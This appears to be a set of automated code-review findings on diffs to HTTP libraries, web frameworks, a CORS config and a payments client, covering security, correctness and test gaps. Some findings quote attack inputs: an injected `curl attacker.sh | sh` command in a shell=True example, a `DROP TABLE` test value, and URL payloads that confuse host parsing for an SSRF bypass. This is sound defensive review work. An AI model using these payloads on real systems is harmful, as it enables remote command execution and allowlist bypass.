findings.body: The new `request()` still advertises `verify=None` and `cert=None` in its signature, but the body only copies `method`, `url`, `headers`, `files`, `data`, `params`, `auth`, `cookies`, `allow_redirects`, `proxies` and `hooks` onto `req`. `verify` and `cert` are never assigned to the request, never passed to `req.prepare()`, and never reach `self.send(prep)` — which constructs a bare `HTTPAdapter()` and calls `adapter.send(request)` with no verification arguments (lines 365-367). Any caller that passes `verify='/path/to/ca-bundle.pem'` (pinning to a private CA) or `cert=(...)` (mutual TLS client auth) gets a connection that ignores both, and if the adapter's own default is unverified the session performs no certificate validation at all, leaving every request open to an on-path attacker. Thread `verify` and `cert` through to the prepared request / adapter send, or remove them from the signature so the silent downgrade is impossible.

findings.title: `old_request` still calls the deleted `_send_request`
findings.body: `_send_request` was removed, but the retained `old_request` body still ends with `return self._send_request(r, **args)`. Any call into `old_request` now raises `AttributeError: 'Session' object has no attribute '_send_request'`. Either keep `_send_request` while `old_request` exists, or delete `old_request` along with it (also note `_send_request` was a private-but-widely-subclassed hook in this library).

findings.title: `request()` silently ignores timeout, verify, cert, prefetch, config, return_response
findings.body: The new `request()` keeps the full public signature but only transfers method, url, headers, files, data, params, auth, cookies, allow_redirects, proxies and hooks onto the `Request`. `timeout`, `verify`, `cert`, `prefetch`, `config` and `return_response` are accepted and then dropped on the floor, and `self.send(prep)` takes no way to pass them. Existing callers doing `session.get(url, timeout=1)` or `verify=False` will now block forever / verify certificates contrary to what they asked — a silently wrong result rather than an error. Either thread these through to `send()`/the adapter or remove them from the signature so callers fail loudly.

findings.title: `close()` is now a no-op and `self.poolmanager` no longer exists
findings.body: `init_poolmanager()` and its call from `__init__` were removed, so `self.poolmanager` is never set, and `close()` was reduced to `pass`. Consequences: (1) `with Session() as s:` / explicit `s.close()` no longer release pooled sockets — connections leak until GC; (2) `session.poolmanager` and subclass overrides of `init_poolmanager()` (a documented extension point for custom pool sizing) now raise `AttributeError` / are dead code; (3) the `pool_connections`, `pool_maxsize` and `support_http0.9` config keys are no longer honoured anywhere in this module. If pooling has moved into `HTTPAdapter`, `close()` should delegate to the adapter rather than be emptied.

findings.title: `send()` constructs a fresh HTTPAdapter per request, defeating pooling
findings.body: A new `HTTPAdapter()` — and therefore a new urllib3 `PoolManager` and a new TCP/TLS connection — is created for every call to `send()`, and it is never closed. Combined with the removal of the session-level PoolManager this means a `Session` no longer reuses connections at all, which is its main reason for existing, and each abandoned adapter holds sockets until GC. Hold one adapter (or an adapter mount map) on the Session instance, created in `__init__` and released in `close()`.

findings.title: Behavior changes to close(), request(), and send() are untested
findings.body: This diff removes the poolmanager-clearing logic from close() (now just `pass`), reroutes Session.request() through a new Request/prepare()/send() flow, and changes Session.send() to delegate to a newly introduced HTTPAdapter instead of calling request.send() directly. No test file is included in this PR, and no existing tests are referenced. If close() silently stops releasing pooled connections, or if HTTPAdapter.send() doesn't behave equivalently to the old request.send(), nothing here would fail — these are exactly the kind of regressions a test suite exists to catch.

findings.title: Stale docstring removed but behavior changed drastically
findings.body: The `close()` method previously had a docstring describing that it "Dispose[s] of any internal state" by closing pooled connections via `self.poolmanager.clear()`. The implementation is now a no-op `pass` statement. The docstring was removed, but callers relying on the documented behavior (cleaning up pooled connections) will get nothing. Update the docstring to reflect that `close()` is now a no-op, or restore the pool cleanup logic.

findings.title: Absolute `from adapters import HTTPAdapter` can bind to an unrelated module
findings.body: Every other import in this module is package-relative (`from .utils import ...`, `from .packages.urllib3.poolmanager import PoolManager`). `from adapters import HTTPAdapter` resolves against `sys.path` rather than the package, so on Python 3 it fails outright unless a top-level `adapters` module happens to exist, and on Python 2 / with the script directory or CWD on `sys.path` it can bind to any module named `adapters` that precedes the package — meaning the class that ultimately performs TLS and issues network requests is chosen by path ordering rather than by the library. Use `from .adapters import HTTPAdapter`.

findings.title: Public method `send()` lacks docstring for updated behavior
findings.body: The `send()` method's docstring (line 364) states "Send a given PreparedRequest." but no longer shows what it returns or how it processes the request. The implementation now instantiates an `HTTPAdapter` and delegates to it. While the one-liner docstring is technically still accurate, a caller cannot infer from the docstring or signature alone that an adapter is involved, or what exceptions or response structure to expect. Consider documenting the return type and the adapter delegation pattern.

findings.title: cookies property returns None on malformed Cookie header
findings.body:
If `SimpleCookie.load()` raises, `_cookies` is set to `None` and returned. Every consumer then breaks: `if name in self.request.cookies` (web.py:321) raises `TypeError: argument of type 'NoneType' is not iterable`, and `self.request.cookies.iterkeys()` (web.py:367) raises `AttributeError`. The previous implementation always returned a `SimpleCookie` instance (it called `clear_all_cookies()` on failure, leaving a dict-like object in place). Since a malformed Cookie header is fully client-controlled, this turns a bad header into a 500 on any handler that reads a cookie. Set `self._cookies = Cookie.SimpleCookie()` (or `self._cookies.clear()`) in the except branch instead of `None`.

_Also raised by the security agent:_ Malformed Cookie header now yields None, breaking every cookie consumer

findings.title: RequestHandler.cookies removed with no backwards-compatible alias
findings.body: `RequestHandler.cookies` was a documented public property; application subclasses and templates commonly do `self.cookies[...]` / `handler.cookies`. Deleting it entirely makes those raise `AttributeError` rather than silently continuing. Keep a thin alias on RequestHandler (`@property def cookies(self): return self.request.cookies`) so existing callers keep working while the canonical implementation lives on HTTPRequest.

findings.title: Moved cookies property with changed error behavior has no test
findings.body: The cookies property moved from RequestHandler to HTTPRequest and its exception-handling behavior changed: previously a bad Cookie header called self.clear_all_cookies() (leaving self._cookies as a populated but empty-ish SimpleCookie), now it sets self._cookies = None. This means request.cookies can now be None, and get_cookie/clear_all_cookies call methods/iterators on it (e.g. `if name in self.request.cookies`, `self.request.cookies.iterkeys()`) which would raise TypeError on a malformed Cookie header. No test exercises a malformed 'Cookie' request header to catch this regression.

findings.title: Malformed cookies are no longer cleared in the response
findings.body: Previously a failed `SimpleCookie.load()` triggered `clear_all_cookies()`, which emitted Set-Cookie headers expiring the client's broken cookies so the next request would recover. The new property on HTTPRequest cannot touch the response, so a client stuck with an unparseable Cookie header now stays broken on every subsequent request. If that recovery behaviour is still wanted, it needs to be re-triggered from the handler side (e.g. detect the parse failure in RequestHandler and call `clear_all_cookies()`).

findings.title: Boundary parameter never matches: missing strip() on split parts
findings.body:
`content_type.split(";")` yields parameter fragments that retain the leading space normally emitted by clients, e.g. `"multipart/form-data; boundary=----WebKitFormBoundaryXYZ"` splits to `["multipart/form-data", " boundary=----WebKitFormBoundaryXYZ"]`. `field.partition("=")` then produces `k == " boundary"`, which fails the `k == "boundary"` comparison, so `_parse_mime_body` is never called, the loop falls through to the `else` clause and every ordinary multipart upload is rejected with "Invalid multipart/form-data". The previous code (`'boundary=' in content_type`) was whitespace-insensitive, so this is a regression for the common case rather than an edge case. Fix by partitioning the stripped fragment: `k, sep, v = field.strip().partition("=")`. While there, consider stripping surrounding double quotes from `v`, since RFC 2045 permits `boundary="..."` and the quoted form would otherwise be passed verbatim to `_parse_mime_body`.

_Also raised by the security agent:_ Parameter not stripped: `boundary` never matches after `;` split

findings.title: No test covers boundary parsing when not the last Content-Type field
findings.body: The whole point of this change is to correctly parse the boundary parameter when it isn't the last field in the Content-Type header (e.g. 'multipart/form-data; boundary=X; charset=utf-8'). There is no test exercising this exact scenario, nor the previous single-field case, in the diff. A regression (e.g. reverting to the old split-on-first-'=' logic, or breaking on leading/trailing whitespace around 'k') would not be caught by any visible test.

findings.title: get_host ignores query/fragment, enabling host-confusion vs. urlparse
findings.body:
`get_host` only strips a path after the first `/`; it never terminates the authority at `?` or `#`. Because the `@` split then runs over the query/fragment text, the resolved host can differ from what RFC-compliant parsers return.

Examples:
- `http://example.com#@attacker.com/` → `/` split yields `example.com#@attacker.com`, `@` split yields host `attacker.com`. `urllib.parse.urlparse` returns netloc `example.com`.
- `http://example.com?x=@attacker.com` → host `attacker.com` here, `example.com` under `urlparse`.

Any caller that validates a user-supplied URL with `urlparse`/a hostname allowlist and then hands the same string to urllib3 will connect to a host it never approved — a straightforward SSRF/allowlist bypass. The same applies to `:` (a `:` inside a fragment is parsed as a port and raises `LocationParseError`, or silently changes the port).

Fix: cut the authority at the first occurrence of any of `/`, `?`, `#` before doing the `@` and `:` splits, or delegate to `urllib.parse`/a parser that handles query and fragment.

findings.title: New util.py logic (make_headers, get_host) has no tests in this diff
findings.body: This PR introduces make_headers and get_host, both of which have meaningful branching behavior (accept_encoding type dispatch, URL parsing with scheme/auth/port extraction, error raising on invalid port). No test file is included in the diff. If these were refactored incorrectly from their original location, nothing here would catch it.

findings.title: LocationParseError message has an unsubstituted %s placeholder
findings.body: `raise LocationParseError("Failed to parse: %s")` never interpolates the offending value, so the exception a caller sees is the literal string `Failed to parse: %s` with no indication of which URL or port failed. Use `"Failed to parse: %s" % url` (or include the original url argument, since `url` has already been rewritten by the splits above — capture the input at the top of the function if you want the full URL in the message).

findings.title: is_connection_dropped returns a list or None instead of a bool
findings.body: The docstring promises "Returns True if the connection is dropped". In practice the function returns three different shapes: a list of sockets (select branch, line 117), `True` (line 125), or an implicit `None` when the poll loop completes without a match. Truthiness happens to work for `if is_connection_dropped(conn):`, but any caller doing `is True`, `is False`, or logging/serialising the result gets a surprise. Add an explicit `return False` after the loop and coerce the select branch to `bool(...)`.

findings.title: accept_encoding unicode strings silently replaced by 'gzip,deflate' on Py2
findings.body: The branch chain tests `isinstance(accept_encoding, str)`. On Python 2 a `unicode` value (e.g. from `from __future__ import unicode_literals` in the caller, or any decoded config value) matches neither `str` nor `list`, so it falls through to the `else` and the caller's explicitly requested encoding is silently discarded and replaced with `'gzip,deflate'`. `six` is already imported in this module (line 16, used on line 68), so `isinstance(accept_encoding, six.string_types)` is the consistent fix. Tuples/other sequences hit the same silent-override path.

findings.title: No test exercises an invalid `direction` value
findings.body: The validation `if sort not in SORTABLE or direction not in DIRECTIONS` guards two independent conditions, but the only negative test (`test_rejects_an_unknown_sort_key`) only supplies a bad `sort` while leaving `direction` at its default valid value. If the `direction not in DIRECTIONS` check were removed or broken (e.g. someone refactors the condition to `and` instead of `or`, or drops the direction check entirely), no test would fail. Add a test that passes an invalid `direction` (e.g. `direction="; DROP TABLE"`) and asserts `ValueError` is raised.

findings.title: httpx 0.28 floor may break callers using APIs removed in 0.28.0
findings.body: Raising the floor to `httpx>=0.28` means every install now resolves to a release that dropped several long-deprecated client APIs — notably the `proxies=` argument on `Client`/`AsyncClient` (replaced by `proxy=`/`mounts=`), the `app=` shortcut (now requires `transport=ASGITransport(app=...)`), and the old `verify=`/`cert=` argument forms. Any call site still using those will now fail at construction time rather than emitting a deprecation warning. Please grep the codebase (and test fixtures, which commonly use `app=` for ASGI test clients) for `proxies=`, `app=` and `httpx.Client(`/`httpx.AsyncClient(` and confirm they are already on the 0.28 forms. No source files were included in this change or in the retrieved context, so this could not be verified here.

findings.title: Exhaustive switch drops the fallback: unknown kind returns undefined
findings.body: Previously the function ended with an unconditional `return` for the key case, so every call produced a string. Now both returns live inside the switch with no `default`, so if an `Event`-shaped value arrives at runtime with a `kind` that is not `"click"` or `"key"` (deserialized JSON, a value crossing a boundary from untyped JS, or a new variant added to the union in a file that is compiled separately), `describe` falls off the end and returns `undefined` while its signature promises `string`. Downstream string operations (`.length`, template interpolation, `.toUpperCase()`) will then crash or render "undefined". Add a `default` branch that either throws or returns a safe placeholder — e.g. `default: { const _exhaustive: never = event; throw new Error(`unknown event kind: ${(event as {kind: string}).kind}`); }` — so the exhaustiveness is enforced at compile time *and* the runtime contract holds.

findings.title: No tests cover the refactored describe() switch logic
findings.body: The switch statement replacing the type-cast branches changes behavior (e.g., click now includes both x and y) but no test file is included in the diff. If this refactor introduced a bug (wrong property access, missing default case, etc.), nothing in the given change would catch it.

findings.title: HTTPMove.location now a URL, breaking documented string contract
findings.body:
`self.location` was previously the exact object the caller passed (documented as "the string it was constructed with"); it is now always a `yarl.URL`. Callers doing `exc.location.startswith("/admin")` will raise `AttributeError` (URL has no `startswith`), and `exc.location == "/login"` will now be False because `URL.__eq__` does not compare equal to a plain `str`. Both are silent-to-loud behaviour changes for existing application code.

If the goal is just to avoid constructing `URL` twice, keep the attribute as the original value and use a local: `url = URL(location); self.headers['Location'] = str(url); self.location = location`. If exposing a `URL` is intentional, it is a breaking API change that needs a doc update and a deprecation path (e.g. keep `location` a string and add `location_url`).

_Also raised by the security agent:_ `.location` type change can silently break redirect allowlist checks

findings.title: Location attribute type changed but documentation contradicts it
findings.body: The `location` attribute is now assigned a `URL` object instead of a string (line 8), but the documented contract in `docs/web_reference.rst` states it is 'the string it was constructed with'. Callers relying on the documented behavior—comparing it with `str.startswith` or passing it directly to string methods—will break. Either revert this change, update the documentation, or ensure the attribute returns a string representation.

findings.title: No test verifies self.location's type/value after the change
findings.body: The change alters the type of `self.location` from the raw string passed to the constructor to a `URL` object. Per docs/web_reference.rst, application code relies on `location` being 'the string it was constructed with' and calls `str.startswith` on it. This is a behavior-affecting change (str -> URL) with no accompanying test asserting `self.location`'s type or value, so a regression (or the intended change itself breaking downstream `startswith` calls) would not be caught by the test suite.

findings.title: readany can return empty bytes before EOF after loop removal
findings.body:
`_wait()` explicitly documents that its future is also resolved at the end of a chunk, which can happen with no new data in the buffer, and that "a caller must re-check its condition after waking rather than assuming data arrived". Replacing the `while` with an `if` removes exactly that re-check: after a spurious/end-of-chunk wake, control falls through to `self._read_nowait(-1)` with an empty buffer and no EOF, returning `b""`.

An empty return from `readany()` is the documented end-of-stream signal for callers (e.g. `async for chunk in resp.content.iter_any()` / `while chunk := await content.readany()` loops), so those callers will silently truncate the body mid-response. Restore the `while` loop so the buffer/EOF condition is re-evaluated after each wake.

_Also raised by the security agent:_ readany can return b'' (EOF sentinel) on a spurious wakeup, truncating bodies

findings.title: Docstring now contradicts changed loop behavior
findings.body: The `_wait()` docstring states that 'a caller must re-check its condition after waking rather than assuming data arrived'. This instruction was accurate when `_wait()` was called within a `while` loop that would re-check the condition on each iteration. After this change to a single `if` statement, `_wait()` is called only once per read attempt, so the re-check behavior no longer occurs at the caller level in the same way. The docstring's guidance about re-checking is now stale and could mislead callers about the actual control flow.

findings.title: No test guards the while→if change in readany wait loop
findings.body: The change replaces `while not self._buffer and not self._eof` with `if not self._buffer and not self._eof`, meaning after a single wakeup from `_wait`, the method proceeds to `_read_nowait` even if the buffer is still empty and eof hasn't been reached (e.g. a spurious wakeup at chunk boundary, as documented in the `_wait` docstring). This can return an empty read prematurely instead of retrying. No test in this diff exercises the case where `_wait` resolves without new data being available, so this regression would not be caught by the existing test suite.

findings.title: Implicit relative import breaks `import requests` on Python 3
findings.body: `from adapters import HTTPAdapter` is an implicit relative import. Implicit relative imports were removed in Python 3, so this line raises `ModuleNotFoundError: No module named 'adapters'` as soon as `requests.sessions` is imported — which happens on `import requests`. Even on Python 2 it is fragile: it silently resolves to a top-level `adapters` module if one exists on `sys.path`, importing the wrong `HTTPAdapter`. Restore the explicit relative form `from .adapters import HTTPAdapter`, matching the neighbouring import on line 6.

findings.title: Bare `from adapters import HTTPAdapter` allows sys.path module hijacking
findings.body:
`from .adapters import HTTPAdapter` unambiguously resolves inside the `requests` package. `from adapters import HTTPAdapter` is resolved against `sys.path`, which for a normal interpreter invocation includes the script directory (and, for `python -c`/`-m`/interactive use, the current working directory) ahead of installed packages. Any attacker who can drop an `adapters.py` into a directory that lands on `sys.path` before the package directory — a shared working directory, a world-writable deploy dir, an unpacked archive an application `chdir`s into — gets arbitrary code executed at import time and gets to supply the `HTTPAdapter` that every `Session` uses for connection setup and TLS certificate verification. That makes it both a code-execution and a transport-security bypass vector for the host application, not just an import-hygiene issue.

Restore the explicit relative form (`from .adapters import HTTPAdapter`) or use the fully qualified `from requests.adapters import HTTPAdapter`.

findings.title: get_cookie raises TypeError when request.cookies is None
findings.body:
`HTTPRequest.cookies` explicitly returns `None` when the `Cookie` header is present but cannot be parsed, and its docstring states "every consumer has to allow for that". Removing the `self.request.cookies is not None` guard means that for any request with a malformed Cookie header, `name in self.request.cookies` evaluates `in` against `None` and raises `TypeError: argument of type 'NoneType' is not iterable`, turning a graceful `default` return into a 500. Restore the guard (or have the caller side normalise to an empty dict), e.g. `if self.request.cookies is not None and name in self.request.cookies:`.

_Also raised by the security agent:_ Malformed Cookie header causes TypeError in get_cookie (remote DoS)

_Also raised by the tests agent:_ No test covers get_cookie when request.cookies is None

findings.title: Dropping .strip() breaks multipart boundary detection
findings.body: `content_type.split(";")` yields segments that retain the whitespace that conventionally follows the separator, e.g. `"multipart/form-data; boundary=abc"` splits into `["multipart/form-data", " boundary=abc"]`. Without `.strip()`, `field.partition("=")` gives `k == " boundary"`, so the `k == "boundary"` test on line 5 never matches and `_parse_mime_body` is never called — multipart form fields and file uploads are silently dropped for essentially every real-world client. Even when a client omits the space, the trailing `\r\n`-free but space-padded value would be carried into `v` and passed to `_parse_mime_body` unstripped, producing a boundary that will not match the body delimiters. Restore `field.strip().partition("=")` (and keep stripping `v` if it may carry trailing whitespace).

findings.title: Dropping .strip() lets clients control whether the multipart body is parsed
findings.body:
The entry point is the client-supplied `Content-Type` request header; the sink is `self._parse_mime_body(v, data)` on line 6. Splitting on `;` leaves the leading space that RFC-conformant senders emit (`multipart/form-data; boundary=abc`), so without `.strip()` the key is `" boundary"` and the `k == "boundary"` test on line 5 never matches — the multipart body is silently not parsed. Conversely a client that omits the space (`multipart/form-data;boundary=abc`) still gets it parsed.

Two consequences: (1) normal uploads silently yield no arguments/files; (2) more importantly, the client now chooses, via one whitespace character, whether Tornado populates the parsed form. Any front proxy, WAF, or upstream filter that does strip whitespace will see and inspect a multipart body that Tornado ignores (or vice versa), which is exactly the kind of parser differential used to slip past request inspection. Trailing whitespace/CR on the value is likewise no longer removed, so `v` can carry stray bytes into the boundary matcher.

Restore `field.strip().partition("=")` (and, if not already handled elsewhere, strip surrounding quotes from `v`).

findings.title: No test covers whitespace-padded multipart boundary fields
findings.body: The change removes `.strip()` before `partition("=")` when parsing Content-Type fields for multipart/form-data. This alters behavior for headers like `multipart/form-data; boundary=xyz` where a leading space precedes `boundary`, since `k` would now be " boundary" instead of "boundary", failing the `k == "boundary"` check. No test in this diff (or referenced) exercises a boundary field with leading whitespace, so this regression would not be caught by any test suite.

findings.title: Error message placeholder removed but not filled
findings.body: The error message on line 7 contains a format placeholder `%s` that is no longer being filled with the `url` variable. The message will now display the literal string "Failed to parse: %s" to users instead of showing the actual URL that failed to parse. This makes the error unhelpful for debugging, as users cannot see which URL caused the problem.

findings.title: No test exercises the broken error-formatting branch
findings.body: The diff changes `LocationParseError("Failed to parse: %s" % url)` to `LocationParseError("Failed to parse: %s")`, which drops the `% url` substitution. If `port.isdigit()` is False, this line runs `"Failed to parse: %s"` with no interpolation argument — actually since there's no `%` operator applied at all now, it just produces a literal string with a literal '%s' in it (no crash), but this silently discards the URL information. There is no test in the repository (none shown/retrieved) that calls the parsing function with a malformed port to check the resulting exception message. Such a test would have caught this regression immediately.

findings.title: Error message keeps `%s` placeholder with no argument supplied
findings.body: Line 7 raises `LocationParseError("Failed to parse: %s")` — the `%s` conversion specifier is still in the string but nothing is interpolated, so the exception message is the literal `Failed to parse: %s` and the offending value is lost, making the error undiagnosable from logs. If the intent was to shorten the message, drop the placeholder too (`"Failed to parse"`); if the intent was to keep the context, restore the interpolation (`"Failed to parse: %s" % url`). Note that at this point `url` has already been rebound on line 4 to the portion before the `:`, so interpolating it yields the host, not the full input.

findings.title: Command injection via shell=True with interpolated name/directory
findings.body:
`create_archive` interpolates `name` and `directory` directly into a shell command string (line 9) and executes it with `shell=True` (line 10). Any shell metacharacter in either argument escapes the intended `tar` invocation: `create_archive("x; curl attacker.sh | sh; #", d)` or a directory of `"; id #"` runs arbitrary commands as the service user.

Fix by dropping the shell and passing an argument list, matching the existing style of `list_exports` on line 5:

```python
subprocess.run(["tar", "-czf", f"/exports/{name}.tar.gz", directory], check=True)
```

Even with the list form, `name` still flows into a filesystem path, so it should additionally be constrained (e.g. reject `/` and `..`, or validate against `[A-Za-z0-9_-]+`) to prevent writing the archive outside `/exports`.

findings.title: Unquoted interpolation into shell=True breaks on spaces and metacharacters
findings.body: `cmd` is built by f-string interpolation and executed with `shell=True`, so `name` and `directory` are subject to word splitting, globbing and metacharacter interpretation. A perfectly legitimate directory such as `/data/my exports` becomes two arguments and tar archives the wrong paths (or fails); a `*` in `directory` is expanded by the shell; a `;` or `$(...)` in either argument executes arbitrary commands. Build an argument list instead and drop the shell: `subprocess.run(["tar", "-czf", f"/exports/{name}.tar.gz", directory], check=True)`, and validate `name` so it cannot contain `/` or `..` and escape the intended output directory. Note that `list_exports` on line 5 already uses the argument-list form, so this is a regression from the module's own pattern.

findings.title: create_archive has no test coverage
findings.body: The new create_archive function builds a shell command via string interpolation and executes it with shell=True. There is no test in this diff exercising it, so a regression (e.g. broken quoting, wrong path construction, or a fix to the injection risk) would not be caught. Add a test that invokes create_archive with a controlled name/directory and asserts on the resulting command or subprocess call parameters (e.g. via monkeypatching subprocess.run and asserting the args/kwargs passed), and ideally a test with a malicious name value to verify safe handling.

findings.title: dashboardCors uses origin "*" together with credentials: true
findings.body:
`dashboardCors` opts out of the `ALLOWED` origin allowlist used by the existing middleware two lines above and accepts any origin while still asking the browser to send and honour credentials (cookies, `Authorization`, TLS client certs).

Why this matters: any route mounted with `dashboardCors` can be called cross-origin by an arbitrary attacker-controlled page while the victim is logged in, and the response body becomes readable by that page. That is full read access to whatever the dashboard endpoints return, plus the ability to perform state-changing requests whose CSRF protection relied on same-origin response reads.

Two caveats I can check and one I cannot:
- With the `cors` package, `origin: "*"` emits the literal `Access-Control-Allow-Origin: *`, and browsers refuse to honour a literal `*` on a credentialed request. So on a stock `cors` install the credentialed cross-origin read is blocked by the browser and the practical result is a dashboard that is simply broken for credentialed calls. If any wrapper or proxy in front of this reflects the request `Origin` instead (a very common "fix" once the wildcard is found not to work), the protection disappears entirely.
- Non-browser callers are unaffected either way, so this is not a server-side authorisation bypass on its own.
- I do not see where `dashboardCors` is mounted, so I cannot name the concrete routes or confirm they are authenticated.

Fix: give the dashboard its own explicit origin list (or extend `ALLOWED`) rather than `"*"`. If the endpoints genuinely need to be public, set `credentials: false` so the wildcard is honest about carrying no ambient authority.

findings.title: origin "*" with credentials:true is rejected by browsers
findings.body:
`dashboardCors` sets `origin: "*"` together with `credentials: true`. The `cors` middleware will emit the literal header `Access-Control-Allow-Origin: *` alongside `Access-Control-Allow-Credentials: true`. Per the Fetch spec, a user agent fails any request made with `credentials: 'include'` (or `withCredentials`) when the allow-origin header is the wildcard — the response is blocked and cookies/Authorization are never applied. So this config cannot achieve what it is evidently trying to achieve (a credentialed dashboard session), and every such call from the dashboard will fail CORS in the browser even though the server returns 200.

Use origin reflection restricted to the dashboard's real origin(s) — e.g. an explicit list or a predicate function, the way `ALLOWED` is used for the existing export on line 6 — and keep `credentials: true`. If the dashboard genuinely makes no credentialed requests, drop `credentials: true` instead; leaving both is a contradiction either way.

findings.title: Public CORS config export lacks documentation
findings.body: The `dashboardCors` export is a public API (exported at module level) whose behaviour combines two seemingly contradictory settings: `origin: "*"` (accept any origin) with `credentials: true` (allow credentials). A caller might reasonably misunderstand what this configuration actually allows, since many CORS security discussions treat wildcard origins and credential-bearing requests as incompatible. At minimum, a comment explaining this combination and why it is correct for the dashboard would clarify intent and prevent misuse.

findings.title: Live AcmePay secret key hardcoded in source
findings.body:
`ACMEPAY_SECRET_KEY` is a literal `acme_live_...` value committed to source control and assigned to `acmepay.api_key`. The `acme_live_` prefix indicates a production credential, not a sandbox one. Anyone with read access to the repository — including CI logs, forks, clones, and anyone who obtains the repo history later — can charge, refund, or read payment data through the AcmePay API.

Actions: (1) revoke/rotate this key at AcmePay immediately, treating it as compromised since it now exists in git history; (2) restore the `os.environ["ACMEPAY_SECRET_KEY"]` lookup (or a secrets-manager fetch); (3) purge the value from history or accept the rotation as the mitigation; (4) consider a secret-scanning pre-commit hook so this class of change is blocked at the source.

findings.title: Live API key hardcoded; per-environment configuration removed
findings.body: `client()` previously read the key from `os.environ["ACMEPAY_SECRET_KEY"]`, so each environment supplied its own credential and a missing key failed loudly at startup. After this change every caller of `client()` — in development, CI, staging and production alike — is pinned to the single `acme_live_...` literal on line 4. Any test or local run that exercises the payments path will now transact against the live account, and the `os` import was dropped so there is no fallback or override path left. Restore the environment lookup (optionally with an explicit error when unset) and keep the secret out of the source tree.

findings.title: Hardcoded production credential exposed without explanation
findings.body: A production API key (`acme_live_...`) is now hardcoded in source at line 4. The previous implementation read from an environment variable, which is a standard secure pattern.
